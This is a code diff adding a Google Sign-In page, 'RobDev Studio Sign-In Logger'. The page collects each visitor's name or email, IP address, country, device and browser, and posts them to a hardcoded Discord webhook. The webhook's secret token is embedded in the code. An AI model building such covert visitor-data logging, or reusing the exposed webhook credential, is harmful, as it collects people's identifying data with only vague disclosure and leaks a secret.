@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>RobDev Studio Sign-In Logger</title>
+<script src="https://accounts.google.com/gsi/client" async defer></script>
+</head>
+<body>
+
+<h1>RobDev Studio Sign-In Logger</h1>
+<div id="g_id_onload"
+     data-client_id="YOUR_GOOGLE_CLIENT_ID"
+     data-auto_prompt="false">
+</div>
+<div class="g_id_signin"></div>
+
+<script>
+async function handleCredentialResponse(response) {
+    // Decode Google token to get username
+    const base64Url = response.credential.split('.')[1];
+    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+    const payload = JSON.parse(atob(base64));
+    const username = payload.name || payload.email || "Unknown";
+
+    // Time
+    const timeOpened = new Date().toLocaleString();
+
+    // Device & browser
+    const ua = navigator.userAgent;
+    let device = /Mobi|Android/i.test(ua) ? "Mobile" : /Tablet|iPad/i.test(ua) ? "Tablet" : "PC";
+    let browser = "Unknown";
+    if (ua.includes("Chrome")) browser = "Chrome";
+    else if (ua.includes("Firefox")) browser = "Firefox";
+    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+    else if (ua.includes("Edge")) browser = "Edge";
+
+    // IP & country
+    let ip = "Unknown", country = "Unknown";
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        ip = data.ip;
+        country = data.country_name;
+    } catch(e) {
+        console.log("Failed to get IP info:", e);
+    }
+
+    // Send to Discord webhook
+    const webhookURL = "https://discord.com/api/webhooks/1445988972835770439/BEAdATfuF_vCWdG6FeXCZQEAaw3BsNv-YsoQGfl3sRQXNw8xDerj7WrFrFkzGYTlf4yo";
+    const content = {
+        content: `**New RobDev Studio Sign-In!**\n**Username:** ${username}\n**Time:** ${timeOpened}\n**Device:** ${device}\n**Browser:** ${browser}\n**IP:** ${ip}\n**Country:** ${country}`
+    };
+
+    await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(content)
+    });
+
+    alert("Signed in! Info sent safely.");
+}
+
+window.onload = () => {
+    google.accounts.id.initialize({
+        client_id: "YOUR_GOOGLE_CLIENT_ID",
+        callback: handleCredentialResponse
+    });
+    google.accounts.id.renderButton(
+        document.querySelector(".g_id_signin"),
+        { theme: "outline", size: "large" }
+    );
+};
+</script>
+
+</body>
+</html>
